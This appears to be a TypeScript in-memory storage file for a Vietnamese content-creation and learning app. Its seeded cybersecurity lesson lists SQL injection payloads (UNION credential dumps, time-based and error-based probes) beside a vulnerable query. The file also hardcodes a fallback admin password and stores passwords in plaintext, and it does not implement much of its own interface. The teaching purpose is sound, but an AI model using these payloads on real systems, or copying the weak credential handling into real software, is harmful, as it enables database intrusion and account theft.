import dotenv from "dotenv";
dotenv.config();

import {
  users,
  projects,
  chatMessages,
  calendarEvents,
  courses,
  lessons,
  userProgress,
  securityChallenges,
  quizzes,
  quizAttempts,
  userProfiles,
  privacySettings,
  notificationSettings,
  calendarIntegration,
  contacts,
  musicIntegration,
  playlists,
  entertainmentPreferences,
  type User,
  type InsertUser,
  type Project,
  type InsertProject,
  type ChatMessage,
  type InsertChatMessage,
  type CalendarEvent,
  type InsertCalendarEvent,
  type Course,
  type InsertCourse,
  type Lesson,
  type InsertLesson,
  type UserProgress,
  type InsertUserProgress,
  type SecurityChallenge,
  type InsertSecurityChallenge,
  type Quiz,
  type InsertQuiz,
  type QuizAttempt,
  type InsertQuizAttempt,
  type UserProfile,
  type InsertUserProfile,
  type PrivacySettings,
  type InsertPrivacySettings,
  type NotificationSettings,
  type InsertNotificationSettings,
  type CalendarIntegration,
  type InsertCalendarIntegration,
  type Contact,
  type InsertContact,
  type MusicIntegration,
  type InsertMusicIntegration,
  type Playlist,
  type InsertPlaylist,
  type EntertainmentPreferences,
  type InsertEntertainmentPreferences,
  languageLearning,
  pronunciationExercises,
  practiceSessions,
  vocabularyEntries,
  learningProgress,
  voiceCommands,
  aiMemory,
  smartReminders,
  appIntegrations,
  communicationLogs,
  privacyControls,
  type LanguageLearning,
  type InsertLanguageLearning,
  type PronunciationExercise,
  type InsertPronunciationExercise,
  type PracticeSession,
  type InsertPracticeSession,
  type VocabularyEntry,
  type InsertVocabularyEntry,
  type LearningProgress,
  type InsertLearningProgress,
  type VoiceCommand,
  type InsertVoiceCommand,
  type AiMemory,
  type InsertAiMemory,
  type SmartReminder,
  type InsertSmartReminder,
  type AppIntegration,
  type InsertAppIntegration,
  type CommunicationLog,
  type InsertCommunicationLog,
  type PrivacyControl,
  type InsertPrivacyControl,
} from "@shared/schema";

export interface IStorage {
  getUser(id: number): Promise<User | undefined>;
  getUserByUsername(username: string): Promise<User | undefined>;
  createUser(user: InsertUser): Promise<User>;

  createProject(project: InsertProject): Promise<Project>;
  getProjectsByUserId(userId: number): Promise<Project[]>;
  getProjectById(id: number): Promise<Project | undefined>;
  updateProject(
    id: number,
    updates: Partial<InsertProject>,
  ): Promise<Project | undefined>;
  deleteProject(id: number): Promise<boolean>;

  createChatMessage(message: InsertChatMessage): Promise<ChatMessage>;
  getChatMessagesByUserId(userId: number): Promise<ChatMessage[]>;
  clearChatHistory(userId: number): Promise<boolean>;

  createCalendarEvent(event: InsertCalendarEvent): Promise<CalendarEvent>;
  getCalendarEventsByUserId(userId: number): Promise<CalendarEvent[]>;
  getUpcomingEvents(userId: number): Promise<CalendarEvent[]>;
  updateCalendarEvent(
    id: number,
    updates: Partial<InsertCalendarEvent>,
  ): Promise<CalendarEvent | undefined>;
  deleteCalendarEvent(id: number): Promise<boolean>;

  getStats(userId: number): Promise<{
    videosCreated: number;
    savedIdeas: number;
    keywordsAnalyzed: number;
    timeSaved: number;
  }>;

  // Learning platform methods
  getCourses(): Promise<Course[]>;
  getCourseById(id: number): Promise<Course | undefined>;
  createCourse(course: InsertCourse): Promise<Course>;
  
  getLessonsByCourseId(courseId: number): Promise<Lesson[]>;
  getLessonById(id: number): Promise<Lesson | undefined>;
  createLesson(lesson: InsertLesson): Promise<Lesson>;
  
  getUserProgress(userId: number, courseId?: number): Promise<UserProgress[]>;
  updateUserProgress(progress: InsertUserProgress): Promise<UserProgress>;
  
  getSecurityChallenges(): Promise<SecurityChallenge[]>;
  getSecurityChallengeById(id: number): Promise<SecurityChallenge | undefined>;
  createSecurityChallenge(challenge: InsertSecurityChallenge): Promise<SecurityChallenge>;

  // Quiz methods
  getQuizzesByCourseId(courseId: number): Promise<Quiz[]>;
  getQuizById(id: number): Promise<Quiz | undefined>;
  createQuiz(quiz: InsertQuiz): Promise<Quiz>;
  
  getQuizAttempts(userId: number, quizId?: number): Promise<QuizAttempt[]>;
  createQuizAttempt(attempt: InsertQuizAttempt): Promise<QuizAttempt>;
  updateQuizAttempt(id: number, updates: Partial<InsertQuizAttempt>): Promise<QuizAttempt | undefined>;

  // User Profile methods
  getUserProfile(userId: number): Promise<UserProfile | undefined>;
  createUserProfile(profile: InsertUserProfile): Promise<UserProfile>;
  updateUserProfile(userId: number, updates: Partial<InsertUserProfile>): Promise<UserProfile | undefined>;

  // Privacy Settings methods
  getPrivacySettings(userId: number): Promise<PrivacySettings | undefined>;
  createPrivacySettings(settings: InsertPrivacySettings): Promise<PrivacySettings>;
  updatePrivacySettings(userId: number, updates: Partial<InsertPrivacySettings>): Promise<PrivacySettings | undefined>;

  // Notification Settings methods
  getNotificationSettings(userId: number): Promise<NotificationSettings | undefined>;
  createNotificationSettings(settings: InsertNotificationSettings): Promise<NotificationSettings>;
  updateNotificationSettings(userId: number, updates: Partial<InsertNotificationSettings>): Promise<NotificationSettings | undefined>;

  // Calendar Integration methods
  getCalendarEvents(userId: number, startDate?: Date, endDate?: Date): Promise<CalendarIntegration[]>;
  getCalendarEventById(id: number): Promise<CalendarIntegration | undefined>;
  createCalendarEvent(event: InsertCalendarIntegration): Promise<CalendarIntegration>;
  updateCalendarEvent(id: number, updates: Partial<InsertCalendarIntegration>): Promise<CalendarIntegration | undefined>;
  deleteCalendarEvent(id: number): Promise<boolean>;

  // Contacts methods
  getContacts(userId: number, searchTerm?: string): Promise<Contact[]>;
  getContactById(id: number): Promise<Contact | undefined>;
  createContact(contact: InsertContact): Promise<Contact>;
  updateContact(id: number, updates: Partial<InsertContact>): Promise<Contact | undefined>;
  deleteContact(id: number): Promise<boolean>;
  getFavoriteContacts(userId: number): Promise<Contact[]>;

  // Music Integration methods
  getMusicIntegrations(userId: number): Promise<MusicIntegration[]>;
  getMusicIntegrationByPlatform(userId: number, platform: string): Promise<MusicIntegration | undefined>;
  createMusicIntegration(integration: InsertMusicIntegration): Promise<MusicIntegration>;
  updateMusicIntegration(id: number, updates: Partial<InsertMusicIntegration>): Promise<MusicIntegration | undefined>;
  deleteMusicIntegration(id: number): Promise<boolean>;

  // Playlists methods
  getPlaylists(userId: number, platform?: string): Promise<Playlist[]>;
  getPlaylistById(id: number): Promise<Playlist | undefined>;
  createPlaylist(playlist: InsertPlaylist): Promise<Playlist>;
  updatePlaylist(id: number, updates: Partial<InsertPlaylist>): Promise<Playlist | undefined>;
  deletePlaylist(id: number): Promise<boolean>;

  // Entertainment Preferences methods
  getEntertainmentPreferences(userId: number): Promise<EntertainmentPreferences | undefined>;
  createEntertainmentPreferences(preferences: InsertEntertainmentPreferences): Promise<EntertainmentPreferences>;
  updateEntertainmentPreferences(userId: number, updates: Partial<InsertEntertainmentPreferences>): Promise<EntertainmentPreferences | undefined>;

  // Subscription management
  getUserSubscription(userId: number): Promise<Subscription | undefined>;
  createSubscription(subscription: InsertSubscription): Promise<Subscription>;
  updateSubscription(id: number, updates: Partial<InsertSubscription>): Promise<Subscription | undefined>;
  cancelSubscription(id: number): Promise<boolean>;

  // Community features
  getDiscussions(courseId?: number, lessonId?: number): Promise<Discussion[]>;
  getDiscussionById(id: number): Promise<Discussion | undefined>;
  createDiscussion(discussion: InsertDiscussion): Promise<Discussion>;
  updateDiscussion(id: number, updates: Partial<InsertDiscussion>): Promise<Discussion | undefined>;
  deleteDiscussion(id: number): Promise<boolean>;
  upvoteDiscussion(discussionId: number, userId: number): Promise<boolean>;

  getDiscussionReplies(discussionId: number): Promise<DiscussionReply[]>;
  createDiscussionReply(reply: InsertDiscussionReply): Promise<DiscussionReply>;
  updateDiscussionReply(id: number, updates: Partial<InsertDiscussionReply>): Promise<DiscussionReply | undefined>;
  deleteDiscussionReply(id: number): Promise<boolean>;
  upvoteReply(replyId: number, userId: number): Promise<boolean>;

  // Portfolio showcase
  getPortfolios(userId?: number, featured?: boolean): Promise<Portfolio[]>;
  getPortfolioById(id: number): Promise<Portfolio | undefined>;
  createPortfolio(portfolio: InsertPortfolio): Promise<Portfolio>;
  updatePortfolio(id: number, updates: Partial<InsertPortfolio>): Promise<Portfolio | undefined>;
  deletePortfolio(id: number): Promise<boolean>;
  likePortfolio(portfolioId: number, userId: number): Promise<boolean>;

  // Mentorship system
  getMentorships(userId: number, role: 'mentor' | 'mentee'): Promise<Mentorship[]>;
  getMentorshipById(id: number): Promise<Mentorship | undefined>;
  createMentorship(mentorship: InsertMentorship): Promise<Mentorship>;
  updateMentorship(id: number, updates: Partial<InsertMentorship>): Promise<Mentorship | undefined>;
  getAvailableMentors(specialties?: string[]): Promise<User[]>;

  // Content analytics
  getContentAnalytics(userId: number): Promise<ContentAnalytics[]>;
  createContentAnalytics(analytics: InsertContentAnalytics): Promise<ContentAnalytics>;
  updateContentAnalytics(id: number, updates: Partial<InsertContentAnalytics>): Promise<ContentAnalytics | undefined>;

  // AI conversations
  getAIConversations(userId: number, sessionId?: string): Promise<AIConversation[]>;
  createAIConversation(conversation: InsertAIConversation): Promise<AIConversation>;

  // Notifications
  getNotifications(userId: number, unreadOnly?: boolean): Promise<Notification[]>;
  createNotification(notification: InsertNotification): Promise<Notification>;
  markNotificationAsRead(id: number): Promise<boolean>;
  markAllNotificationsAsRead(userId: number): Promise<boolean>;

  // Language Learning & Pronunciation
  getLanguageLearningProfile(userId: number): Promise<LanguageLearning | undefined>;
  createLanguageLearningProfile(profile: InsertLanguageLearning): Promise<LanguageLearning>;
  updateLanguageLearningProfile(userId: number, updates: Partial<InsertLanguageLearning>): Promise<LanguageLearning | undefined>;

  getPronunciationExercises(language: string, category?: string, difficulty?: string): Promise<PronunciationExercise[]>;
  getPronunciationExerciseById(id: number): Promise<PronunciationExercise | undefined>;
  createPronunciationExercise(exercise: InsertPronunciationExercise): Promise<PronunciationExercise>;

  getPracticeSessions(userId: number, exerciseId?: number): Promise<PracticeSession[]>;
  createPracticeSession(session: InsertPracticeSession): Promise<PracticeSession>;
  updatePracticeSession(id: number, updates: Partial<InsertPracticeSession>): Promise<PracticeSession | undefined>;

  getVocabularyEntries(userId: number, language?: string): Promise<VocabularyEntry[]>;
  createVocabularyEntry(entry: InsertVocabularyEntry): Promise<VocabularyEntry>;
  updateVocabularyEntry(id: number, updates: Partial<InsertVocabularyEntry>): Promise<VocabularyEntry | undefined>;

  getLearningProgress(userId: number, language?: string): Promise<LearningProgress[]>;
  updateLearningProgress(userId: number, language: string, skillType: string, updates: Partial<InsertLearningProgress>): Promise<LearningProgress | undefined>;

  // Voice Commands & AI Memory
  getVoiceCommands(userId: number, actionType?: string): Promise<VoiceCommand[]>;
  createVoiceCommand(command: InsertVoiceCommand): Promise<VoiceCommand>;

  getAiMemories(userId: number, memoryType?: string): Promise<AiMemory[]>;
  createAiMemory(memory: InsertAiMemory): Promise<AiMemory>;
  updateAiMemory(id: number, updates: Partial<InsertAiMemory>): Promise<AiMemory | undefined>;
  searchAiMemories(userId: number, query: string): Promise<AiMemory[]>;

  // Smart Reminders
  getSmartReminders(userId: number, isCompleted?: boolean): Promise<SmartReminder[]>;
  createSmartReminder(reminder: InsertSmartReminder): Promise<SmartReminder>;
  updateSmartReminder(id: number, updates: Partial<InsertSmartReminder>): Promise<SmartReminder | undefined>;
  deleteSmartReminder(id: number): Promise<boolean>;

  // App Integrations
  getAppIntegrations(userId: number, appType?: string): Promise<AppIntegration[]>;
  createAppIntegration(integration: InsertAppIntegration): Promise<AppIntegration>;
  updateAppIntegration(id: number, updates: Partial<InsertAppIntegration>): Promise<AppIntegration | undefined>;

  // Communication Logs
  getCommunicationLogs(userId: number, communicationType?: string): Promise<CommunicationLog[]>;
  createCommunicationLog(log: InsertCommunicationLog): Promise<CommunicationLog>;

  // Privacy Controls
  getPrivacyControls(userId: number): Promise<PrivacyControl | undefined>;
  createPrivacyControls(controls: InsertPrivacyControl): Promise<PrivacyControl>;
  updatePrivacyControls(userId: number, updates: Partial<InsertPrivacyControl>): Promise<PrivacyControl | undefined>;
}

export class MemStorage implements IStorage {
  private users: Map<number, User>;
  private projects: Map<number, Project>;
  private chatMessages: Map<number, ChatMessage>;
  private calendarEvents: Map<number, CalendarEvent>;
  private courses: Map<number, Course>;
  private lessons: Map<number, Lesson>;
  private userProgressData: Map<number, UserProgress>;
  private securityChallengesData: Map<number, SecurityChallenge>;
  private quizzesData: Map<number, Quiz>;
  private quizAttemptsData: Map<number, QuizAttempt>;
  currentUserId: number;
  currentProjectId: number;
  currentChatId: number;
  currentEventId: number;
  currentCourseId: number;
  currentLessonId: number;
  currentProgressId: number;
  currentChallengeId: number;
  currentQuizId: number;
  currentQuizAttemptId: number;

  constructor() {
    this.users = new Map();
    this.projects = new Map();
    this.chatMessages = new Map();
    this.calendarEvents = new Map();
    this.courses = new Map();
    this.lessons = new Map();
    this.userProgressData = new Map();
    this.securityChallengesData = new Map();
    this.quizzesData = new Map();
    this.quizAttemptsData = new Map();
    this.currentUserId = 1;
    this.currentProjectId = 1;
    this.currentChatId = 1;
    this.currentEventId = 1;
    this.currentCourseId = 1;
    this.currentLessonId = 1;
    this.currentProgressId = 1;
    this.currentChallengeId = 1;
    this.currentQuizId = 1;
    this.currentQuizAttemptId = 1;

    // Create default user using environment variables
    const defaultUsername = process.env.ADMIN_USERNAME || "tham";
    const defaultPassword = process.env.ADMIN_PASSWORD || "password";

    this.createUser({ username: defaultUsername, password: defaultPassword });

    this.addSampleData();
    this.addLearningContent();
    this.addQuizData();
  }

  private async addSampleData() {
    const userId = 1;

    await this.createProject({
      title: "5 Cách Kiếm Tiền Online 2024",
      type: "youtube",
      content: {
        type: "titles",
        data: {
          titles: [
            "5 Cách Kiếm Tiền Online 2024 - Không Cần Vốn Ban Đầu!",
            "Sinh Viên Kiếm 10 Triệu/Tháng Từ Nhà - Bí Quyết Được Tiết Lộ",
            "Làm Giàu Online: 5 Phương Pháp Hiệu Quả Nhất 2024",
          ],
        },
        topic: "kiếm tiền online",
        audience: "gen-z",
        style: "clickbait",
      },
      userId,
    });

    await this.createProject({
      title: "Ứng Dụng Giao Đồ Ăn Thông Minh",
      type: "app-idea",
      content: {
        type: "app_idea",
        data: {
          name: "FoodieGo",
          description:
            "Ứng dụng giao đồ ăn với AI đề xuất món phù hợp sở thích và ngân sách",
          features: [
            "AI đề xuất món ăn thông minh",
            "Theo dõi chi tiêu ăn uống",
            "Đặt trước combo tiết kiệm",
          ],
          monetization: "Hoa hồng từ đối tác nhà hàng + phí giao hàng",
          timeline: "6-8 tháng phát triển",
          potential: 8,
        },
        category: "food-tech",
        target: "gen-z",
        budget: "trung bình",
      },
      userId,
    });

    await this.createProject({
      title: "Kịch Bản: Cách Tạo Thumbnail Viral",
      type: "script",
      content: {
        type: "script",
        data: {
          script:
            "**MỞ ĐẦU (0-30s)**\nChào các bạn! Hôm nay mình sẽ chia sẻ bí quyết tạo thumbnail viral giúp video của bạn thu hút hàng triệu view! ...",
        },
        title: "Cách Tạo Thumbnail Viral",
        duration: "10 phút",
        style: "giáo dục",
      },
      userId,
    });

    await this.createChatMessage({
      message:
        "Tôi muốn bắt đầu làm YouTube về chủ đề kiếm tiền online, bạn có thể tư vấn không?",
      role: "user",
      userId,
    });

    await this.createChatMessage({
      message:
        "Tuyệt vời! Để bắt đầu YouTube về kiếm tiền online hiệu quả, bạn nên...",
      role: "assistant",
      userId,
    });

    await this.createCalendarEvent({
      title: "Quay video: 5 Lỗi Newbie Thường Mắc",
      description:
        "Chuẩn bị script và setup quay video về những lỗi cơ bản khi bắt đầu kiếm tiền online",
      date: new Date(Date.now() + 24 * 60 * 60 * 1000),
      type: "youtube",
      userId,
    });
  }

  async getUser(id: number): Promise<User | undefined> {
    return this.users.get(id);
  }

  async getUserByUsername(username: string): Promise<User | undefined> {
    return Array.from(this.users.values()).find(
      (user) => user.username === username,
    );
  }

  async createUser(insertUser: InsertUser): Promise<User> {
    const id = this.currentUserId++;
    const user: User = { ...insertUser, id };
    this.users.set(id, user);
    return user;
  }

  async createProject(insertProject: InsertProject): Promise<Project> {
    const id = this.currentProjectId++;
    const project: Project = {
      ...insertProject,
      id,
      createdAt: new Date(),
    };
    this.projects.set(id, project);
    return project;
  }

  async getProjectsByUserId(userId: number): Promise<Project[]> {
    return Array.from(this.projects.values())
      .filter((project) => project.userId === userId)
      .sort((a, b) => b.createdAt.getTime() - a.createdAt.getTime());
  }

  async getProjectById(id: number): Promise<Project | undefined> {
    return this.projects.get(id);
  }

  async updateProject(
    id: number,
    updates: Partial<InsertProject>,
  ): Promise<Project | undefined> {
    const project = this.projects.get(id);
    if (!project) return undefined;

    const updatedProject = { ...project, ...updates };
    this.projects.set(id, updatedProject);
    return updatedProject;
  }

  async deleteProject(id: number): Promise<boolean> {
    return this.projects.delete(id);
  }

  async createChatMessage(
    insertMessage: InsertChatMessage,
  ): Promise<ChatMessage> {
    const id = this.currentChatId++;
    const message: ChatMessage = {
      ...insertMessage,
      id,
      createdAt: new Date(),
    };
    this.chatMessages.set(id, message);
    return message;
  }

  async getChatMessagesByUserId(userId: number): Promise<ChatMessage[]> {
    return Array.from(this.chatMessages.values())
      .filter((message) => message.userId === userId)
      .sort((a, b) => a.createdAt.getTime() - b.createdAt.getTime());
  }

  async clearChatHistory(userId: number): Promise<boolean> {
    const userMessages = Array.from(this.chatMessages.values()).filter(
      (message) => message.userId === userId,
    );

    userMessages.forEach((message) => {
      this.chatMessages.delete(message.id);
    });

    return true;
  }

  async createCalendarEvent(
    insertEvent: InsertCalendarEvent,
  ): Promise<CalendarEvent> {
    const id = this.currentEventId++;
    const event: CalendarEvent = {
      ...insertEvent,
      id,
      createdAt: new Date(),
      description: insertEvent.description || null,
    };
    this.calendarEvents.set(id, event);
    return event;
  }

  async getCalendarEventsByUserId(userId: number): Promise<CalendarEvent[]> {
    return Array.from(this.calendarEvents.values())
      .filter((event) => event.userId === userId)
      .sort((a, b) => a.date.getTime() - b.date.getTime());
  }

  async getUpcomingEvents(userId: number): Promise<CalendarEvent[]> {
    const now = new Date();
    return Array.from(this.calendarEvents.values())
      .filter((event) => event.userId === userId && event.date >= now)
      .sort((a, b) => a.date.getTime() - b.date.getTime())
      .slice(0, 5);
  }

  async updateCalendarEvent(
    id: number,
    updates: Partial<InsertCalendarEvent>,
  ): Promise<CalendarEvent | undefined> {
    const event = this.calendarEvents.get(id);
    if (!event) return undefined;

    const updatedEvent = { ...event, ...updates };
    this.calendarEvents.set(id, updatedEvent);
    return updatedEvent;
  }

  async deleteCalendarEvent(id: number): Promise<boolean> {
    return this.calendarEvents.delete(id);
  }

  async getStats(userId: number): Promise<{
    videosCreated: number;
    savedIdeas: number;
    keywordsAnalyzed: number;
    timeSaved: number;
  }> {
    const userProjects = await this.getProjectsByUserId(userId);

    const videosCreated = userProjects.filter(
      (p) => p.type === "youtube",
    ).length;
    const savedIdeas = userProjects.filter((p) => p.type === "app-idea").length;
    const keywordsAnalyzed = userProjects.filter(
      (p) => p.type === "keyword",
    ).length;
    const timeSaved = userProjects.length * 2;

    return {
      videosCreated,
      savedIdeas,
      keywordsAnalyzed,
      timeSaved,
    };
  }

  // Learning platform methods
  async getCourses(): Promise<Course[]> {
    return Array.from(this.courses.values()).sort((a, b) => a.id - b.id);
  }

  async getCourseById(id: number): Promise<Course | undefined> {
    return this.courses.get(id);
  }

  async createCourse(insertCourse: InsertCourse): Promise<Course> {
    const id = this.currentCourseId++;
    const course: Course = {
      ...insertCourse,
      id,
      createdAt: new Date(),
    };
    this.courses.set(id, course);
    return course;
  }

  async getLessonsByCourseId(courseId: number): Promise<Lesson[]> {
    return Array.from(this.lessons.values())
      .filter(lesson => lesson.courseId === courseId)
      .sort((a, b) => a.order - b.order);
  }

  async getLessonById(id: number): Promise<Lesson | undefined> {
    return this.lessons.get(id);
  }

  async createLesson(insertLesson: InsertLesson): Promise<Lesson> {
    const id = this.currentLessonId++;
    const lesson: Lesson = {
      ...insertLesson,
      id,
      createdAt: new Date(),
      codeExample: insertLesson.codeExample || null,
      exercise: insertLesson.exercise || null,
    };
    this.lessons.set(id, lesson);
    return lesson;
  }

  async getUserProgress(userId: number, courseId?: number): Promise<UserProgress[]> {
    return Array.from(this.userProgressData.values())
      .filter(progress => {
        if (courseId) {
          return progress.userId === userId && progress.courseId === courseId;
        }
        return progress.userId === userId;
      })
      .sort((a, b) => a.id - b.id);
  }

  async updateUserProgress(insertProgress: InsertUserProgress): Promise<UserProgress> {
    // Check if progress already exists
    const existing = Array.from(this.userProgressData.values())
      .find(p => p.userId === insertProgress.userId && 
                 p.courseId === insertProgress.courseId && 
                 p.lessonId === insertProgress.lessonId);

    if (existing) {
      const updated = { ...existing, ...insertProgress };
      this.userProgressData.set(existing.id, updated);
      return updated;
    }

    const id = this.currentProgressId++;
    const progress: UserProgress = {
      ...insertProgress,
      id,
      createdAt: new Date(),
      completed: insertProgress.completed || false,
      score: insertProgress.score || null,
      completedAt: insertProgress.completedAt || null,
    };
    this.userProgressData.set(id, progress);
    return progress;
  }

  async getSecurityChallenges(): Promise<SecurityChallenge[]> {
    return Array.from(this.securityChallengesData.values()).sort((a, b) => a.id - b.id);
  }

  async getSecurityChallengeById(id: number): Promise<SecurityChallenge | undefined> {
    return this.securityChallengesData.get(id);
  }

  async createSecurityChallenge(insertChallenge: InsertSecurityChallenge): Promise<SecurityChallenge> {
    const id = this.currentChallengeId++;
    const challenge: SecurityChallenge = {
      ...insertChallenge,
      id,
      createdAt: new Date(),
    };
    this.securityChallengesData.set(id, challenge);
    return challenge;
  }

  private async addLearningContent() {
    // Create Web Development Course
    const webDevCourse = await this.createCourse({
      title: "Lập trình Web Full-Stack với JavaScript",
      description: "Khóa học toàn diện từ HTML/CSS cơ bản đến ứng dụng React/Node.js chuyên nghiệp",
      category: "web-dev",
      level: "beginner",
      duration: "12 tuần",
      technologies: ["HTML", "CSS", "JavaScript", "React", "Node.js", "MongoDB"],
      syllabus: {
        weeks: [
          { week: 1, topic: "HTML & CSS Foundation", projects: ["Portfolio Website"] },
          { week: 2, topic: "JavaScript ES6+", projects: ["Interactive Calculator"] },
          { week: 3, topic: "DOM Manipulation", projects: ["Task Manager"] },
          { week: 4, topic: "Async JavaScript", projects: ["Weather App"] },
          { week: 5, topic: "React Basics", projects: ["Component Library"] },
          { week: 6, topic: "React Hooks & State", projects: ["E-commerce Cart"] },
          { week: 7, topic: "Node.js & Express", projects: ["REST API"] },
          { week: 8, topic: "Database Integration", projects: ["User Authentication"] },
          { week: 9, topic: "Full-Stack Project", projects: ["Social Media App"] },
          { week: 10, topic: "Testing & Deployment", projects: ["Production Deploy"] },
          { week: 11, topic: "Performance Optimization", projects: ["Speed Improvements"] },
          { week: 12, topic: "Final Project", projects: ["Portfolio Showcase"] }
        ]
      }
    });

    // Create Cybersecurity Course
    const cybersecurityCourse = await this.createCourse({
      title: "An ninh mạng Web & Ethical Hacking",
      description: "Học cách bảo vệ ứng dụng web khỏi các cuộc tấn công phổ biến và thực hành ethical hacking",
      category: "cybersecurity",
      level: "intermediate",
      duration: "8 tuần",
      technologies: ["Burp Suite", "OWASP ZAP", "Metasploit", "Wireshark", "Kali Linux"],
      syllabus: {
        weeks: [
          { week: 1, topic: "Web Security Fundamentals", vulnerabilities: ["Information Disclosure", "Error Handling"] },
          { week: 2, topic: "Injection Attacks", vulnerabilities: ["SQL Injection", "NoSQL Injection", "Command Injection"] },
          { week: 3, topic: "Authentication & Session", vulnerabilities: ["Session Hijacking", "Password Attacks"] },
          { week: 4, topic: "Cross-Site Attacks", vulnerabilities: ["XSS", "CSRF", "Clickjacking"] },
          { week: 5, topic: "Server Security", vulnerabilities: ["XXE", "SSRF", "File Upload"] },
          { week: 6, topic: "Advanced Attacks", vulnerabilities: ["Deserialization", "Race Conditions"] },
          { week: 7, topic: "Penetration Testing", tools: ["Reconnaissance", "Vulnerability Assessment"] },
          { week: 8, topic: "Security Implementation", practices: ["Secure Code Review", "Defense Strategies"] }
        ]
      }
    });

    // Add Web Development Lessons
    await this.createLesson({
      courseId: webDevCourse.id,
      title: "HTML5 Semantic Elements và Accessibility",
      content: `HTML5 mang đến các thẻ semantic giúp cấu trúc trang web rõ ràng và accessible:

## Semantic Elements chính:
- <header>: Phần đầu trang hoặc section
- <nav>: Menu điều hướng
- <main>: Nội dung chính
- <article>: Bài viết độc lập
- <section>: Phân chia nội dung
- <aside>: Nội dung bên
- <footer>: Phần chân trang

## Best Practices:
1. Sử dụng heading hierarchy (h1 → h6) đúng cách
2. Thêm alt text cho images
3. Sử dụng aria-labels khi cần thiết
4. Đảm bảo contrast ratio ≥ 4.5:1
5. Keyboard navigation support`,
      codeExample: `<!DOCTYPE html>
<html lang="vi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Portfolio - Nguyễn Văn A</title>
</head>
<body>
    <header>
        <nav aria-label="Main navigation">
            <ul>
                <li><a href="#about">Giới thiệu</a></li>
                <li><a href="#projects">Dự án</a></li>
                <li><a href="#contact">Liên hệ</a></li>
            </ul>
        </nav>
    </header>
    
    <main>
        <section id="about" aria-labelledby="about-heading">
            <h1 id="about-heading">Xin chào, tôi là Nguyễn Văn A</h1>
            <p>Full-stack Developer với 3 năm kinh nghiệm</p>
        </section>
        
        <section id="projects" aria-labelledby="projects-heading">
            <h2 id="projects-heading">Dự án nổi bật</h2>
            <article>
                <h3>E-commerce Platform</h3>
                <img src="project1.jpg" alt="Screenshot trang chủ e-commerce platform với giao diện responsive">
                <p>Nền tảng thương mại điện tử với React và Node.js</p>
            </article>
        </section>
    </main>
    
    <footer>
        <p>&copy; 2024 Nguyễn Văn A. All rights reserved.</p>
    </footer>
</body>
</html>`,
      exercise: {
        instruction: "Tạo trang profile cá nhân sử dụng HTML5 semantic elements",
        requirements: ["Sử dụng đầy đủ header, nav, main, section, article, aside, footer", "Có ít nhất 3 section khác nhau", "Images phải có alt text mô tả", "Heading hierarchy đúng cách"],
        solution: "Trang profile hoàn chỉnh với cấu trúc semantic và accessibility tốt"
      },
      order: 1,
      type: "theory"
    });

    await this.createLesson({
      courseId: webDevCourse.id,
      title: "CSS Grid và Flexbox Layout",
      content: `CSS Grid và Flexbox là hai công cụ mạnh mẽ để tạo layout responsive:

## CSS Grid - Layout 2D:
- grid-template-columns/rows: Định nghĩa cột và hàng
- grid-gap: Khoảng cách giữa items
- grid-area: Đặt tên cho vùng
- fr unit: Flexible fractions

## Flexbox - Layout 1D:
- justify-content: Căn chỉnh trục chính
- align-items: Căn chỉnh trục phụ
- flex-direction: Hướng của flex items
- flex-wrap: Cho phép wrap items

## Khi nào dùng gì:
- Grid: Layout tổng thể, complex layouts
- Flexbox: Components, navbar, cards alignment`,
      codeExample: `/* CSS Grid Layout */
.container {
    display: grid;
    grid-template-columns: 1fr 3fr 1fr;
    grid-template-rows: auto 1fr auto;
    grid-template-areas: 
        "header header header"
        "sidebar main aside"
        "footer footer footer";
    gap: 20px;
    min-height: 100vh;
}

.header { grid-area: header; }
.sidebar { grid-area: sidebar; }
.main { grid-area: main; }
.aside { grid-area: aside; }
.footer { grid-area: footer; }

/* Responsive Grid */
@media (max-width: 768px) {
    .container {
        grid-template-columns: 1fr;
        grid-template-areas: 
            "header"
            "main"
            "sidebar"
            "aside"
            "footer";
    }
}

/* Flexbox Cards */
.card-container {
    display: flex;
    flex-wrap: wrap;
    gap: 20px;
    justify-content: space-between;
}

.card {
    flex: 1 1 300px; /* grow shrink basis */
    background: white;
    padding: 20px;
    border-radius: 8px;
    box-shadow: 0 2px 8px rgba(0,0,0,0.1);
}

/* Perfect Center */
.center {
    display: flex;
    justify-content: center;
    align-items: center;
    min-height: 100vh;
}`,
      exercise: {
        instruction: "Tạo layout responsive với CSS Grid và Flexbox",
        requirements: ["Header, sidebar, main content, footer với Grid", "Card layout với Flexbox", "Responsive breakpoints cho mobile", "Hover effects cho cards"],
        solution: "Layout hoàn chỉnh responsive trên mọi device"
      },
      order: 2,
      type: "practice"
    });

    // Add Cybersecurity Lessons
    await this.createLesson({
      courseId: cybersecurityCourse.id,
      title: "SQL Injection Attacks và Prevention",
      content: `SQL Injection là một trong những lỗ hổng bảo mật phổ biến nhất:

## Cách hoạt động:
1. Attacker chèn mã SQL độc hại vào input
2. Ứng dụng thực thi câu query không an toàn
3. Database bị compromised

## Các loại SQL Injection:
- **Union-based**: Sử dụng UNION để lấy data
- **Boolean-based**: Dựa vào true/false response
- **Time-based**: Dựa vào delay trong response
- **Error-based**: Lợi dụng error messages

## Prevention Methods:
1. **Prepared Statements**: Tách biệt code và data
2. **Input Validation**: Kiểm tra và filter input
3. **Least Privilege**: Hạn chế quyền database user
4. **WAF**: Web Application Firewall`,
      codeExample: `-- VULNERABLE CODE (Node.js)
const query = "SELECT * FROM users WHERE username = '" + username + "' AND password = '" + password + "'";
db.query(query, (err, result) => {
    // Attacker có thể inject: admin'--
    // Query trở thành: SELECT * FROM users WHERE username = 'admin'--' AND password = ''
});

-- SECURE CODE (Prepared Statements)
const query = "SELECT * FROM users WHERE username = ? AND password = ?";
db.query(query, [username, hashedPassword], (err, result) => {
    // Tham số được escape tự động
});

-- PAYLOAD EXAMPLES
-- Union injection
' UNION SELECT 1,username,password FROM admin_users--

-- Boolean injection  
' AND 1=1-- (true)
' AND 1=2-- (false)

-- Time-based injection
'; WAITFOR DELAY '00:00:05'--

-- Error-based injection
' AND (SELECT COUNT(*) FROM information_schema.tables)>0--

-- DETECTION METHODS
-- 1. Error messages
' OR 1=1--
" OR 1=1--

-- 2. Timing attacks
'; SELECT pg_sleep(5)--

-- 3. Boolean logic
' AND substring(user(),1,1)='a'--`,
      exercise: {
        instruction: "Thực hành SQL Injection trên lab environment",
        requirements: ["Tìm vulnerable parameter", "Extract database names", "Dump user tables", "Viết script automation"],
        solution: "Complete SQL injection exploit chain"
      },
      order: 1,
      type: "security-lab"
    });

